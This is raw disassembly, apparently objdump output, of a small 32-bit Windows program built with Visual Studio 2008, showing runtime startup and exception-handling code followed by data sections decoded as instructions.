mov    0x403374,%ecx
mov    %ecx,(%eax)
call   *0x40207c
mov    0x403370,%ecx
mov    %ecx,(%eax)
mov    0x402060,%eax
mov    (%eax),%eax
mov    %eax,0x40337c
call   0x401b78
call   0x401dd5
cmpl   $0x0,0x403014
jne    0x40193c
push   $0x401dd5
call   *0x402090
pop    %ecx
call   0x401daa
cmpl   $0xffffffff,0x403010
jne    0x401953
push   $0xffffffff
call   *0x402094
pop    %ecx
xor    %eax,%eax
ret    
call   0x401dd8
jmp    0x4016ff
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
sub    $0x328,%esp
mov    %eax,0x403148
mov    %ecx,0x403144
mov    %edx,0x403140
mov    %ebx,0x40313c
mov    %esi,0x403138
mov    %edi,0x403134
data16 mov %ss,0x403160
data16 mov %cs,0x403154
data16 mov %ds,0x403130
data16 mov %es,0x40312c
data16 mov %fs,0x403128
data16 mov %gs,0x403124
pushf  
popl   0x403158
mov    0x0(%ebp),%eax
mov    %eax,0x40314c
mov    0x4(%ebp),%eax
mov    %eax,0x403150
lea    0x8(%ebp),%eax
mov    %eax,0x40315c
mov    -0x320(%ebp),%eax
movl   $0x10001,0x403098

mov    0x403150,%eax
mov    %eax,0x40304c
movl   $0xc0000409,0x403040

movl   $0x1,0x403044

mov    0x403000,%eax
mov    %eax,-0x328(%ebp)
mov    0x403004,%eax
mov    %eax,-0x324(%ebp)
call   *0x40201c
mov    %eax,0x403090
push   $0x1
call   0x401e6e
pop    %ecx
push   $0x0
call   *0x402020
push   $0x40210c
call   *0x402024
cmpl   $0x0,0x403090
jne    0x401a52
push   $0x1
call   0x401e6e
pop    %ecx
push   $0xc0000409
call   *0x402028
push   %eax
call   *0x40202c
leave  
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
mov    0x8(%ebp),%eax
mov    (%eax),%eax
cmpl   $0xe06d7363,(%eax)
jne    0x401aa2
cmpl   $0x3,0x10(%eax)
jne    0x401aa2
mov    0x14(%eax),%eax
cmp    $0x19930520,%eax
je     0x401a9d
cmp    $0x19930521,%eax
je     0x401a9d
cmp    $0x19930522,%eax
je     0x401a9d
cmp    $0x1994000,%eax
jne    0x401aa2
call   0x401e74
xor    %eax,%eax
pop    %ebp
ret    $0x4
push   $0x401a66
call   *0x402020
xor    %eax,%eax
ret    
jmp    *0x4020b8
push   $0x14
push   $0x402268
call   0x401d2c
pushl  0x40338c
mov    0x40208c,%esi
call   *%esi
pop    %ecx
mov    %eax,-0x1c(%ebp)
cmp    $0xffffffff,%eax
jne    0x401aeb
pushl  0x8(%ebp)
call   *0x4020c4
pop    %ecx
jmp    0x401b52
push   $0x8
call   0x401e86
pop    %ecx
andl   $0x0,-0x4(%ebp)
pushl  0x40338c
call   *%esi
mov    %eax,-0x1c(%ebp)
pushl  0x403388
call   *%esi
pop    %ecx
pop    %ecx
mov    %eax,-0x20(%ebp)
lea    -0x20(%ebp),%eax
push   %eax
lea    -0x1c(%ebp),%eax
push   %eax
pushl  0x8(%ebp)
mov    0x402084,%esi
call   *%esi
pop    %ecx
push   %eax
call   0x401e80
mov    %eax,-0x24(%ebp)
pushl  -0x1c(%ebp)
call   *%esi
mov    %eax,0x40338c
pushl  -0x20(%ebp)
call   *%esi
add    $0x14,%esp
mov    %eax,0x403388
movl   $0xfffffffe,-0x4(%ebp)
call   0x401b58
mov    -0x24(%ebp),%eax
call   0x401d71
ret    
push   $0x8
call   0x401e7a
pop    %ecx
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
pushl  0x8(%ebp)
call   0x401abc
neg    %eax
sbb    %eax,%eax
neg    %eax
pop    %ecx
dec    %eax
pop    %ebp
ret    
mov    %edi,%edi
push   %esi
mov    $0x40223c,%eax
mov    $0x40223c,%esi
push   %edi
mov    %eax,%edi
cmp    %esi,%eax
jae    0x401b9b
mov    (%edi),%eax
test   %eax,%eax
je     0x401b94
call   *%eax
add    $0x4,%edi
cmp    %esi,%edi
jb     0x401b8c
pop    %edi
pop    %esi
ret    
mov    %edi,%edi
push   %esi
mov    $0x402244,%eax
mov    $0x402244,%esi
push   %edi
mov    %eax,%edi
cmp    %esi,%eax
jae    0x401bc1
mov    (%edi),%eax
test   %eax,%eax
je     0x401bba
call   *%eax
add    $0x4,%edi
cmp    %esi,%edi
jb     0x401bb2
pop    %edi
pop    %esi
ret    
jmp    *0x4020a8
int3   
int3   
int3   
int3   
int3   
int3   
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
mov    0x8(%ebp),%ecx
mov    $0x5a4d,%eax
cmp    %ax,(%ecx)
je     0x401be6
xor    %eax,%eax
pop    %ebp
ret    
mov    0x3c(%ecx),%eax
add    %ecx,%eax
cmpl   $0x4550,(%eax)
jne    0x401be2
xor    %edx,%edx
mov    $0x10b,%ecx
cmp    %cx,0x18(%eax)
sete   %dl
mov    %edx,%eax
pop    %ebp
ret    
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
mov    0x8(%ebp),%eax
mov    0x3c(%eax),%ecx
add    %eax,%ecx
movzwl 0x14(%ecx),%eax
push   %ebx
push   %esi
movzwl 0x6(%ecx),%esi
xor    %edx,%edx
push   %edi
lea    0x18(%eax,%ecx,1),%eax
test   %esi,%esi
jbe    0x401c4d
mov    0xc(%ebp),%edi
mov    0xc(%eax),%ecx
cmp    %ecx,%edi
jb     0x401c45
mov    0x8(%eax),%ebx
add    %ecx,%ebx
cmp    %ebx,%edi
jb     0x401c4f
inc    %edx
add    $0x28,%eax
cmp    %esi,%edx
jb     0x401c35
xor    %eax,%eax
pop    %edi
pop    %esi
pop    %ebx
pop    %ebp
ret    
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
push   $0xfffffffe
push   $0x402288
push   $0x401d85
mov    %fs:0x0,%eax
push   %eax
sub    $0x8,%esp
push   %ebx
push   %esi
push   %edi
mov    0x403000,%eax
xor    %eax,-0x8(%ebp)
xor    %ebp,%eax
push   %eax
lea    -0x10(%ebp),%eax
mov    %eax,%fs:0x0
mov    %esp,-0x18(%ebp)
movl   $0x0,-0x4(%ebp)
push   $0x400000
call   0x401bd0
add    $0x4,%esp
test   %eax,%eax
je     0x401d02
mov    0x8(%ebp),%eax
sub    $0x400000,%eax
push   %eax
push   $0x400000
call   0x401c10
add    $0x8,%esp
test   %eax,%eax
je     0x401d02
mov    0x24(%eax),%eax
shr    $0x1f,%eax
not    %eax
and    $0x1,%eax
movl   $0xfffffffe,-0x4(%ebp)
mov    -0x10(%ebp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
ret    
mov    -0x14(%ebp),%eax
mov    (%eax),%ecx
mov    (%ecx),%eax
xor    %edx,%edx
cmp    $0xc0000005,%eax
sete   %dl
mov    %edx,%eax
ret    
mov    -0x18(%ebp),%esp
movl   $0xfffffffe,-0x4(%ebp)
xor    %eax,%eax
mov    -0x10(%ebp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
ret    
int3   
jmp    *0x40209c
jmp    *0x402098
int3   
int3   
push   $0x401d85
pushl  %fs:0x0
mov    0x10(%esp),%eax
mov    %ebp,0x10(%esp)
lea    0x10(%esp),%ebp
sub    %eax,%esp
push   %ebx
push   %esi
push   %edi
mov    0x403000,%eax
xor    %eax,-0x4(%ebp)
xor    %ebp,%eax
push   %eax
mov    %esp,-0x18(%ebp)
pushl  -0x8(%ebp)
mov    -0x4(%ebp),%eax
movl   $0xfffffffe,-0x4(%ebp)
mov    %eax,-0x8(%ebp)
lea    -0x10(%ebp),%eax
mov    %eax,%fs:0x0
ret    
mov    -0x10(%ebp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
push   %ecx
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
pushl  0x14(%ebp)
pushl  0x10(%ebp)
pushl  0xc(%ebp)
pushl  0x8(%ebp)
push   $0x40169f
push   $0x403000
call   0x401e8c
add    $0x18,%esp
pop    %ebp
ret    
mov    %edi,%edi
push   %esi
push   $0x30000
push   $0x10000
xor    %esi,%esi
push   %esi
call   0x401e98
add    $0xc,%esp
test   %eax,%eax
je     0x401dd3
push   %esi
push   %esi
push   %esi
push   %esi
push   %esi
call   0x401e92
add    $0x14,%esp
pop    %esi
ret    
xor    %eax,%eax
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
sub    $0x10,%esp
mov    0x403000,%eax
andl   $0x0,-0x8(%ebp)
andl   $0x0,-0x4(%ebp)
push   %ebx
push   %edi
mov    $0xbb40e64e,%edi
mov    $0xffff0000,%ebx
cmp    %edi,%eax
je     0x401e0a
test   %eax,%ebx
je     0x401e0a
not    %eax
mov    %eax,0x403004
jmp    0x401e6a
push   %esi
lea    -0x8(%ebp),%eax
push   %eax
call   *0x402008
mov    -0x4(%ebp),%esi
xor    -0x8(%ebp),%esi
call   *0x40200c
xor    %eax,%esi
call   *0x402010
xor    %eax,%esi
call   *0x402014
xor    %eax,%esi
lea    -0x10(%ebp),%eax
push   %eax
call   *0x402018
mov    -0xc(%ebp),%eax
xor    -0x10(%ebp),%eax
xor    %eax,%esi
cmp    %edi,%esi
jne    0x401e50
mov    $0xbb40e64f,%esi
jmp    0x401e5b
test   %esi,%ebx
jne    0x401e5b
mov    %esi,%eax
shl    $0x10,%eax
or     %eax,%esi
mov    %esi,0x403000
not    %esi
mov    %esi,0x403004
pop    %esi
pop    %edi
pop    %ebx
leave  
ret    
jmp    *0x402078
jmp    *0x402074
jmp    *0x402064
jmp    *0x402058
jmp    *0x40205c
jmp    *0x402068
jmp    *0x40206c
jmp    *0x402070
jmp    *0x4020c8
lea    -0x160(%ebp),%ecx
jmp    *0x402044
mov    0x8(%esp),%edx
lea    -0x164(%edx),%eax
mov    -0x168(%edx),%ecx
xor    %eax,%ecx
call   0x40169f
add    $0x8,%eax
mov    -0x8(%edx),%ecx
xor    %eax,%ecx
call   0x40169f
mov    $0x4022ac,%eax
jmp    0x401e9e




add    $0x24,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
sub    %ch,(%eax)
add    %al,(%eax)
adc    (%eax),%ch
add    %al,(%eax)
cld    
daa    
add    %al,(%eax)
in     (%dx),%al
daa    
add    %al,(%eax)
shlb   %cl,(%edi)
add    %al,(%eax)
mov    $0xa0000027,%esi
daa    
add    %al,(%eax)
test   %ah,(%edi)
add    %al,(%eax)
jo     0x402051
add    %al,(%eax)
pop    %esp
daa    
add    %al,(%eax)
ds daa 
add    %al,(%eax)
ss daa 
add    %al,(%eax)
and    %ah,(%edi)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
adc    $0x26,%al
add    %al,(%eax)
fsubs  (%esi)
add    %al,(%eax)
xchg   %eax,%esi
add    %al,%es:(%eax)
push   %esp
add    %al,%es:(%eax)
(bad)  
and    $0x0,%eax
add    %al,(%eax)
push   $0x76000025
and    $0x24e20000,%eax
add    %al,(%eax)
pop    %esi
and    $0x259a0000,%eax
add    %al,(%eax)
mov    $0x25,%ah
add    %al,(%eax)
(bad)  
and    $0x254a0000,%eax
add    %al,(%eax)
xor    $0x25,%al
add    %al,(%eax)
repnz and $0x0,%al
add    %ah,(%edx)
and    $0x25100000,%eax
add    %al,(%eax)
add    0x25880000,%ah
add    %al,(%eax)
into   
and    $0x0,%al
add    %bh,-0x55ffffdc(%eax)
and    $0x0,%al
add    %bl,-0x6fffffdc(%esi)
and    $0x0,%al
add    %cl,0x7a000024(%eax)
and    $0x0,%al
add    %dh,0x24(%edx)
add    %al,(%eax)
push   $0x56000024
and    $0x0,%al
add    %cl,0x24(%eax)
add    %al,(%eax)
xor    (%eax,%eax,1),%ah
add    %ah,(%edx)
and    $0x0,%al
add    %bh,0x25(%esi)
add    %al,(%eax)
push   %eax
sub    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %dh,0x40(%esi,%edx,1)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
jne    0x4020fa
inc    %eax
add    %ch,0x401a(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %dh,%ah
loopne 0x4020a4
push   %ecx
add    %al,(%eax)
add    %al,(%eax)
add    (%eax),%al
add    %al,(%eax)
jg     0x402102
add    %al,(%eax)
mov    $0x21,%al
add    %al,(%eax)
mov    $0x15,%al
add    %al,(%eax)
inc    %eax
xor    %al,0x0(%eax)
cwtl   
xor    %al,0x0(%eax)
bound  %esp,0x64(%ecx)
and    %ah,0x6c(%ecx)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x74(%ecx)
imul   $0x6e550000,0x6e(%edi),%ebp
popa   
bound  %ebp,0x20(%ebp,%eiz,2)
je     0x40219c
and    %dh,0x65(%edx)
je     0x4021a4
imul   $0x73752065,0x76(%ebp),%esp
gs jb  0x4021aa
popa   
insl   (%dx),%es:(%edi)
or     %gs:(%eax),%al
add    %al,(%eax)
add    %al,0x3a(%ebx)
pop    %esp
ja     0x4021b2
outsb  %ds:(%esi),(%dx)
outsl  %fs:(%esi),(%dx)
ja     0x4021c1
pop    %esp
je     0x4021b2
jae    0x4021be
jae    0x4021b1
insl   (%dx),%es:(%edi)
popa   
insb   (%dx),%es:(%edi)
ja     0x4021bb
jb     0x4021c1
cs push $0x6f
bound  %eax,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %cl,0x0(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %dh,(%eax)
inc    %eax
add    %dh,(%eax)
and    0x0(%eax),%al
add    (%eax),%al
add    %al,(%eax)
push   %edx
push   %ebx
inc    %esp
push   %ebx
ds cmp %ah,%ch
sub    %bl,0x68(%eax)
popa   
dec    %ebp
sahf   
ficomp -0x72(%ebp)
ljmp   $0x0,$0x1a46220
add    %al,0x3a(%ebx)
pop    %esp
inc    %esp
outsl  %ds:(%esi),(%dx)
arpl   %si,0x6d(%ebp)
outsb  %gs:(%esi),(%dx)
je     0x402247
and    %ah,0x6e(%ecx)
and    %dl,%fs:0x65(%ebx)
je     0x402251
imul   $0x69565c73,0x67(%esi),%ebp
jbe    0x40224b
imul   $0x20,0x79(%ebp,%ecx,2),%ebx
inc    %esp
outsl  %ds:(%esi),(%dx)
arpl   %si,0x6d(%ebp)
outsb  %gs:(%esi),(%dx)
je     0x402267
pop    %esp
push   %esi
imul   $0x53206c61,0x75(%ebx),%esi
je     0x402274
imul   $0x38303032,%fs:0x20(%edi),%ebp

pop    %esp
push   %eax
jb     0x40227a
push   $0x65
arpl   %si,0x5c(%ebx,%esi,2)
push   %esp
gs insl (%dx),%es:(%edi)
jo     0x402282
popa   
je     0x40227e
pop    %esp
push   %edx
gs insb (%dx),%es:(%edi)
gs popa 
jae    0x402286
pop    %esp
push   %esp
gs insl (%dx),%es:(%edi)
jo     0x402293
popa   
je     0x40228f
jo,pn  0x402291
bound  %eax,(%eax)
add    %al,-0x4fffffe3(%ebp)
push   %ds
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
(bad)  
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %dl,%al
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
jmp    *0x39004018
sbb    %al,0x0(%eax)
add    %al,(%eax)
add    %al,(%eax)
(bad)  
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %cl,%ah
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bl,0x1b(%eax)
inc    %eax
add    %al,(%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bl,%al
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
(bad)  
jmp    0x4022ba
inc    %eax
add    %bh,%bh
sbb    $0x40,%al
add    %bh,%bh
(bad)  
(bad)  
jmp    *0x5220040(%esi,%ebx,1)
xchg   %eax,%ebx
sbb    %eax,(%ecx)
add    %al,(%eax)
add    %ah,0x40(%edx,%eiz,1)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
xor    $0x23,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
adc    $0x24,%al
add    %al,(%eax)
add    %ah,(%eax)
add    %al,(%eax)
mov    %fs,(%ebx)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
cmp    $0x24,%al
add    %al,(%eax)
pop    %eax
and    %al,(%eax)
add    %dh,0x0(%ebx,%eiz,1)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %dl,(%edi,%eiz,1)
add    %al,(%eax)
inc    %eax
and    %al,(%eax)
add    %bh,(%ebx,%eiz,1)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
inc    %edx
sub    %al,(%eax)
add    %cl,(%eax)
and    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%esp)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
sub    %ch,(%eax)
add    %al,(%eax)
adc    (%eax),%ch
add    %al,(%eax)
cld    
daa    
add    %al,(%eax)
in     (%dx),%al
daa    
add    %al,(%eax)
shlb   %cl,(%edi)
add    %al,(%eax)
mov    $0xa0000027,%esi
daa    
add    %al,(%eax)
test   %ah,(%edi)
add    %al,(%eax)
jo     0x402385
add    %al,(%eax)
pop    %esp
daa    
add    %al,(%eax)
ds daa 
add    %al,(%eax)
ss daa 
add    %al,(%eax)
and    %ah,(%edi)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
adc    $0x26,%al
add    %al,(%eax)
fsubs  (%esi)
add    %al,(%eax)
xchg   %eax,%esi
add    %al,%es:(%eax)
push   %esp
add    %al,%es:(%eax)
(bad)  
and    $0x0,%eax
add    %al,(%eax)
push   $0x76000025
and    $0x24e20000,%eax
add    %al,(%eax)
pop    %esi
and    $0x259a0000,%eax
add    %al,(%eax)
mov    $0x25,%ah
add    %al,(%eax)
(bad)  
and    $0x254a0000,%eax
add    %al,(%eax)
xor    $0x25,%al
add    %al,(%eax)
repnz and $0x0,%al
add    %ah,(%edx)
and    $0x25100000,%eax
add    %al,(%eax)
add    0x25880000,%ah
add    %al,(%eax)
into   
and    $0x0,%al
add    %bh,-0x55ffffdc(%eax)
and    $0x0,%al
add    %bl,-0x6fffffdc(%esi)
and    $0x0,%al
add    %cl,0x7a000024(%eax)
and    $0x0,%al
add    %dh,0x24(%edx)
add    %al,(%eax)
push   $0x56000024
and    $0x0,%al
add    %cl,0x24(%eax)
add    %al,(%eax)
xor    (%eax,%eax,1),%ah
add    %ah,(%edx)
and    $0x0,%al
add    %bh,0x25(%esi)
add    %al,(%eax)
push   %eax
sub    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %bl,0x1(%edi)
inc    %edi
gs je  0x40245f
jae    0x402471
jb     0x40245c
popa   
insl   (%dx),%es:(%edi)
gs push %edi
add    %al,(%eax)
inc    %ecx
inc    %esp
push   %esi
inc    %ecx
push   %eax
dec    %ecx
xor    (%edx),%esi
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %al,(%eax)
pop    %ds
add    %bh,(%edi)
aas    
pop    %edi
push   %ebp
inc    %eax
pop    %ecx
inc    %ecx
push   %eax
inc    %ecx
pop    %eax
dec    %ecx
inc    %eax
pop    %edx
add    %ch,(%esi)
add    $0x6e697270,%eax
je     0x4024a0
add    %al,(%eax)
dec    %ebp
push   %ebx
push   %esi
inc    %ebx
push   %edx
cmp    %esi,(%eax)
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %dl,0x6d615f01
jae    0x4024b6
pop    %edi
gs js  0x4024bc
je     0x402455
add    %dh,%bh
add    %bl,0x5f(%edi)
ja     0x4024c3
gs je  0x4024cc
popa   
imul   $0x736772,0x61(%esi),%ebp
add    %ch,(%ecx,%eax,1)
pop    %edi
arpl   %sp,0x78(%ebp)
imul   $0x655f017c,0x0(%eax,%eax,1),%esi

js     0x4024e1
je     0x40247a
data16 add %bl,0x58(%edi)
arpl   %si,0x74(%eax)
inc    %esi
imul   $0x4cc0072,0x65(%esp,%esi,2),%ebp

gs js  0x4024f6
je     0x40248f
add    %bh,%al
add    %bl,0x5f(%edi)
ja     0x4024ff
outsb  %ds:(%esi),(%dx)
imul   $0x4000076,0x6e(%ebp,%eiz,2),%esi

add    0x69(%edi),%bl
outsb  %ds:(%esi),(%dx)
imul   $0x5006d72,0x65(%esp,%esi,2),%esi

add    0x69(%edi),%bl
outsb  %ds:(%esi),(%dx)
imul   $0x655f6d72,0x65(%esp,%esi,2),%esi

add    %bh,(%ecx,%eax,1)
pop    %edi
arpl   %bp,0x6e(%edi)
imul   $0x7268,0x74(%edi),%sp
gs popa 
fs insb (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x6c(%ecx)
gs add %ah,%bl
add    %bl,0x5f(%edi)
jae    0x402539
je     0x40254b
jae    0x40253d
jb     0x402547
popa   
je     0x402545
gs jb  0x402552
add    %al,(%eax)
or     (%ecx),%eax
pop    %edi
popa   
fs push $0x75
jae    0x40255f
pop    %edi
imul   $0xcb00,%fs:0x0(%esi),%si
add    %bl,0x5f(%edi)
jo     0x402557
pop    %edi
arpl   %bp,0x6d(%edi)
insl   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
fs add %al,%gs:(%eax)
iret   
add    %bl,0x5f(%edi)
jo     0x402567
pop    %edi
insw   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
fs add %al,%gs:(%eax)
push   $0x1
pop    %edi
outsb  %gs:(%esi),(%dx)
arpl   %bp,0x64(%edi)
gs pop %edi
jo     0x40258b
imul   $0xe0007265,0x74(%esi),%ebp
add    %bl,0x5f(%edi)
jae    0x40258d
je     0x402589
popa   
jo     0x40259d
pop    %edi
je     0x4025a9
jo     0x402597
add    %al,(%eax)
dec    %ebx
add    %ebx,0x63(%edi)
jb     0x4025ae
pop    %edi
fs bound %esi,%gs:0x67(%ebp)
addr16 gs jb 0x4025a3
push   $0x6b6f6f
add    %al,0x0(%ebx)
aas    
je     0x4025b4
jb     0x4025be
imul   $0x40406574,0x61(%esi),%ebp
pop    %ecx
inc    %ecx
pop    %eax
pop    %eax
pop    %edx
add    %ah,%dh
add    0x75(%edi),%ebx
outsb  %ds:(%esi),(%dx)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x0(%ebx)
xchg   %eax,%esi
add    %bl,0x5f(%edi)
fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
gs js  0x4025dd
je     0x402576
jbe    0x40257a
pop    %edi
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x0(%ebx)
sbb    $0x3,%al
pop    %edi
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
gs js  0x4025ef
je     0x402588
pusha  
add    %ebx,0x64(%edi)
arpl   %bp,%gs:0x64(%edi)
gs pop %edi
jo     0x402603
imul   $0x73007265,0x74(%esi),%ebp
add    %ebx,0x65(%edi)
js     0x402603
gs jo  0x402617
pop    %edi
push   $0x6c646e61
gs jb  0x4025e0
pop    %edi
arpl   %bp,0x6d(%edi)
insl   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
add    %cl,(%ebx)
add    0x69(%edi),%bl
outsb  %ds:(%esi),(%dx)
jbe    0x40262a
imul   $0x77,0x5f(%ebp),%esp
popa   
je     0x402635
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
add    %al,(%eax)
aas    
add    %ebx,0x63(%edi)
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
je     0x402640
outsl  %ds:(%esi),(%dx)
insb   (%dx),%es:(%edi)
data16 jo 0x402632
jae    0x4025d5
add    %ah,0x6(%ebx)
aas    
arpl   %bp,0x73(%edi,%ebp,2)
gs inc %eax
aas    
and    $0x62,%al
popa   
jae    0x40264e
arpl   %bx,0x6f(%edi)
data16 jae 0x40265f
jb     0x402652
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x40265d
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x40267e
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
pop    %eax
pop    %eax
pop    %edx
add    %cl,0x1(%edi)
aas    
aas    
xor    %bh,(%edi)
and    $0x62,%al
popa   
jae    0x402688
arpl   %bx,0x6f(%edi)
data16 jae 0x402699
jb     0x40268c
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402697
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x4026b8
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
inc    %eax
push   %eax
inc    %edx
inc    %esp
dec    %eax
dec    %eax
inc    %eax
pop    %edx
add    %al,(%eax)
xor    %cl,(%eax)
aas    
data16 insb (%dx),%es:(%edi)
jne    0x4026ce
push   $0x62243f40
popa   
jae    0x4026cc
arpl   %bx,0x6f(%edi)
jae    0x4026dc
jb     0x4026cf
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x4026da
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x4026fb
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
inc    %ecx
inc    %ecx
push   %esi
xor    %esi,(%edx)
inc    %eax
pop    %eax
pop    %edx
add    %bl,0xa(%ebx)
aas    
jo     0x402710
je     0x4026dd
aas    
and    $0x62,%al
popa   
jae    0x40270c
arpl   %bx,0x6f(%edi)
jae    0x40271c
jb     0x40270f
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x40271a
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x40273b
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
inc    %ecx
inc    %ecx
push   %esi
xor    %esi,(%edx)
inc    %eax
inc    %esp
inc    %eax
pop    %edx
add    %al,(%eax)
add    $0x5f3f3f04,%eax
inc    %esp
aas    
and    $0x62,%al
popa   
jae    0x40274d
arpl   %bx,0x6f(%edi)
data16 jae 0x40275e
jb     0x402751
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x40275c
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x40277d
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
pop    %eax
pop    %eax
pop    %edx
add    %al,(%eax)
dec    %ebp
push   %ebx
push   %esi
inc    %ebx
push   %eax
cmp    %esi,(%eax)
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %bh,0x746e4902(%ebp)
gs jb  0x402794
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x65(%ebx)
fs inc %ebp
js     0x402793
push   $0x65676e61
add    %ah,(%ecx)
add    $0x53,%al
insb   (%dx),%es:(%edi)
gs gs jo 0x40273e
mov    $0x746e4902,%edx
gs jb  0x4027b2
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x65(%ebx)
fs inc %ebx
outsl  %ds:(%esi),(%dx)
insl   (%dx),%es:(%edi)
jo     0x4027b1
jb     0x4027b7
inc    %ebp
js     0x4027b8
